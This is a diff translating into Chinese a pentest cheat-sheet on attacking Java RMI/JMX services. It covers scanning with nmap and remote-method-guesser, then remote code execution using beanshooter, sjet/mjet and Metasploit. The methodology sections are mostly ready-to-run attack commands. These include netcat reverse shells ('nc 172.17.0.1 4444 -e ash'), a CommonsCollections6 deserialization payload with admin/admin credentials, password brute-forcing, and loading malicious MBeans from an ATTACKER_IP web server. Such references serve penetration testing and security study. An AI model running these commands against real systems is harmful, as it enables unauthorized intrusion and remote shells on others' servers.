@@ -1,27 +1,29 @@
+[原文文档](README.en.md)
+
 # Java RMI
 
-> Java RMI (Remote Method Invocation) is a Java API that allows an object running in one JVM (Java Virtual Machine) to invoke methods on an object running in another JVM, even if they're on different physical machines. RMI provides a mechanism for Java-based distributed computing.
+> Java RMI（远程方法调用）是一个Java API，允许在一个JVM（Java虚拟机）中运行的对象调用在另一个JVM中运行的对象的方法，即使它们在不同的物理机器上。RMI为基于Java的分布式计算提供了机制。
 
-## Summary
+## 目录
 
-* [Tools](#tools)
-* [Detection](#detection)
-* [Methodology](#methodology)
-    * [RCE using beanshooter](#rce-using-beanshooter)
-    * [RCE using sjet/mjet](#rce-using-sjet-or-mjet)
-    * [RCE using Metasploit](#rce-using-metasploit)
-* [References](#references)
+* [工具](#工具)
+* [检测](#检测)
+* [方法论](#方法论)
+    * [使用beanshooter进行RCE](#使用beanshooter进行rce)
+    * [使用sjet/mjet进行RCE](#使用sjet或mjet进行rce)
+    * [使用Metasploit进行RCE](#使用metasploit进行rce)
+* [参考资料](#参考资料)
 
-## Tools
+## 工具
 
-* [siberas/sjet](https://github.com/siberas/sjet) - siberas JMX exploitation toolkit
-* [mogwailabs/mjet](https://github.com/mogwailabs/mjet) - MOGWAI LABS JMX exploitation toolkit
-* [qtc-de/remote-method-guesser](https://github.com/qtc-de/remote-method-guesser) - Java RMI Vulnerability Scanner
-* [qtc-de/beanshooter](https://github.com/qtc-de/beanshooter) - JMX enumeration and attacking tool.
+* [siberas/sjet](https://github.com/siberas/sjet) - siberas JMX利用工具包
+* [mogwailabs/mjet](https://github.com/mogwailabs/mjet) - MOGWAI LABS JMX利用工具包
+* [qtc-de/remote-method-guesser](https://github.com/qtc-de/remote-method-guesser) - Java RMI漏洞扫描器
+* [qtc-de/beanshooter](https://github.com/qtc-de/beanshooter) - JMX枚举和攻击工具。
 
-## Detection
+## 检测
 
-* Using [nmap](https://nmap.org/):
+* 使用[nmap](https://nmap.org/)：
 
   ```powershell
   $ nmap -sV --script "rmi-dumpregistry or rmi-vuln-classloader" -p TARGET_PORT TARGET_IP -Pn -v
@@ -36,7 +38,7 @@
   |     javax.management.remote.rmi.RMIServerImpl_Stub
   ```
 
-* Using [qtc-de/remote-method-guesser](https://github.com/qtc-de/remote-method-guesser):
+* 使用[qtc-de/remote-method-guesser](https://github.com/qtc-de/remote-method-guesser)：
 
   ```bash
   $ rmg scan 172.17.0.2 --ports 0-65535
@@ -62,7 +64,7 @@
   [...]
   ```
 
-* Using [rapid7/metasploit-framework](https://github.com/rapid7/metasploit-framework)
+* 使用[rapid7/metasploit-framework](https://github.com/rapid7/metasploit-framework)
 
   ```bash
   use auxiliary/scanner/misc/java_rmi_server
@@ -71,49 +73,49 @@
   run
   ```
 
-## Methodology
+## 方法论
 
-If a Java Remote Method Invocation (RMI) service is poorly configured, it becomes vulnerable to various Remote Code Execution (RCE) methods. One method involves hosting an MLet file and directing the JMX service to load MBeans from a distant server, achievable using tools like mjet or sjet. The remote-method-guesser tool is newer and combines RMI service enumeration with an overview of recognized attack strategies.
+如果Java远程方法调用（RMI）服务配置不当，它就会容易受到各种远程代码执行（RCE）方法的攻击。一种方法是托管一个MLet文件，并指示JMX服务从远程服务器加载MBeans，这可以通过使用mjet或sjet等工具实现。remote-method-guesser工具是较新的工具，它将RMI服务枚举与已知攻击策略的概述结合起来。
 
-### RCE using beanshooter
+### 使用beanshooter进行RCE
 
-* List available attributes: `beanshooter info 172.17.0.2 9010`
-* Display value of an attribute: `beanshooter attr 172.17.0.2 9010 java.lang:type=Memory Verbose`
-* Set the value of an attribute: `beanshooter attr 172.17.0.2 9010 java.lang:type=Memory Verbose true --type boolean`
-* Bruteforce a password protected JMX service: `beanshooter brute 172.17.0.2 1090`
-* List registered MBeans: `beanshooter list 172.17.0.2 9010`
-* Deploy an MBean: `beanshooter deploy 172.17.0.2 9010 non.existing.example.ExampleBean qtc.test:type=Example --jar-file exampleBean.jar --stager-url http://172.17.0.1:8000`
-* Enumerate JMX endpoint: `beanshooter enum 172.17.0.2 1090`
-* Invoke method on a JMX endpoint: `beanshooter invoke 172.17.0.2 1090 com.sun.management:type=DiagnosticCommand --signature 'vmVersion()'`
-* Invoke arbitrary public and static Java methods:
+* 列出可用属性：`beanshooter info 172.17.0.2 9010`
+* 显示属性值：`beanshooter attr 172.17.0.2 9010 java.lang:type=Memory Verbose`
+* 设置属性值：`beanshooter attr 172.17.0.2 9010 java.lang:type=Memory Verbose true --type boolean`
+* 暴力破解受密码保护的JMX服务：`beanshooter brute 172.17.0.2 1090`
+* 列出已注册的MBeans：`beanshooter list 172.17.0.2 9010`
+* 部署MBean：`beanshooter deploy 172.17.0.2 9010 non.existing.example.ExampleBean qtc.test:type=Example --jar-file exampleBean.jar --stager-url http://172.17.0.1:8000`
+* 枚举JMX端点：`beanshooter enum 172.17.0.2 1090`
+* 调用JMX端点上的方法：`beanshooter invoke 172.17.0.2 1090 com.sun.management:type=DiagnosticCommand --signature 'vmVersion()'`
+* 调用任意公共和静态Java方法：
 
     ```ps1
     beanshooter model 172.17.0.2 9010 de.qtc.beanshooter:version=1 java.io.File 'new java.io.File("/")'
     beanshooter invoke 172.17.0.2 9010 de.qtc.beanshooter:version=1 --signature 'list()'
     ```
 
-* Standard MBean execution: `beanshooter standard 172.17.0.2 9010 exec 'nc 172.17.0.1 4444 -e ash'`
-* Deserialization attacks on a JMX endpoint: `beanshooter serial 172.17.0.2 1090 CommonsCollections6 "nc 172.17.0.1 4444 -e ash" --username admin --password admin`
+* 标准MBean执行：`beanshooter standard 172.17.0.2 9010 exec 'nc 172.17.0.1 4444 -e ash'`
+* 对JMX端点进行反序列化攻击：`beanshooter serial 172.17.0.2 1090 CommonsCollections6 "nc 172.17.0.1 4444 -e ash" --username admin --password admin`
 
-### RCE using sjet or mjet
+### 使用sjet或mjet进行RCE
 
-#### Requirements
+#### 要求
 
 * Jython
-* The JMX server can connect to a http service that is controlled by the attacker
-* JMX authentication is not enabled
+* JMX服务器可以连接到攻击者控制的http服务
+* JMX身份验证未启用
 
-#### Remote Command Execution
+#### 远程命令执行
 
-The attack involves the following steps:
+攻击包括以下步骤：
 
-* Starting a web server that hosts the MLet and a JAR file with the malicious MBeans
-* Creating a instance of the MBean `javax.management.loading.MLet` on the target server, using JMX
-* Invoking the `getMBeansFromURL` method of the MBean instance, passing the webserver URL as parameter. The JMX service will connect to the http server and parse the MLet file.
-* The JMX service downloads and loades the JAR files that were referenced in the MLet file, making the malicious MBean available over JMX.
-* The attacker finally invokes methods from the malicious MBean.
+* 启动一个托管MLet和包含恶意MBeans的JAR文件的Web服务器
+* 使用JMX在目标服务器上创建MBean `javax.management.loading.MLet`的实例
+* 调用MBean实例的`getMBeansFromURL`方法，将Web服务器URL作为参数传递。JMX服务将连接到http服务器并解析MLet文件。
+* JMX服务下载并加载MLet文件中引用的JAR文件，使恶意MBean通过JMX可用。
+* 攻击者最终从恶意MBean调用方法。
 
-Exploit the JMX using [siberas/sjet](https://github.com/siberas/sjet) or [mogwailabs/mjet](https://github.com/mogwailabs/mjet)
+使用[siberas/sjet](https://github.com/siberas/sjet)或[mogwailabs/mjet](https://github.com/mogwailabs/mjet)利用JMX
 
 ```powershell
 jython sjet.py TARGET_IP TARGET_PORT super_secret install http://ATTACKER_IP:8000 8000
@@ -128,7 +130,7 @@ jython mjet.py TARGET_IP TARGET_PORT command super_secret "whoami"
 jython mjet.py TARGET_IP TARGET_PORT command super_secret shell
 ```
 
-### RCE using Metasploit
+### 使用Metasploit进行RCE
 
 ```bash
 use exploit/multi/misc/java_rmi_server
@@ -138,8 +140,8 @@ set RPORT <PORT>
 run
 ```
 
-## References
+## 参考资料
 
-* [Attacking RMI based JMX services - Hans-Martin Münch - April 28, 2019](https://mogwailabs.de/en/blog/2019/04/attacking-rmi-based-jmx-services/)
-* [JMX RMI - MULTIPLE APPLICATIONS RCE - Red Timmy Security - March 26, 2019](https://www.exploit-db.com/docs/english/46607-jmx-rmi-–-multiple-applications-remote-code-execution.pdf)
-* [remote-method-guesser - BHUSA 2021 Arsenal - Tobias Neitzel - August 15, 2021](https://www.slideshare.net/TobiasNeitzel/remotemethodguesser-bhusa2021-arsenal)
+* [攻击基于RMI的JMX服务 - Hans-Martin Münch - 2019年4月28日](https://mogwailabs.de/en/blog/2019/04/attacking-rmi-based-jmx-services/)
+* [JMX RMI - 多应用程序RCE - Red Timmy Security - 2019年3月26日](https://www.exploit-db.com/docs/english/46607-jmx-rmi-–-multiple-applications-remote-code-execution.pdf)
+* [remote-method-guesser - BHUSA 2021 Arsenal - Tobias Neitzel - 2021年8月15日](https://www.slideshare.net/TobiasNeitzel/remotemethodguesser-bhusa2021-arsenal)
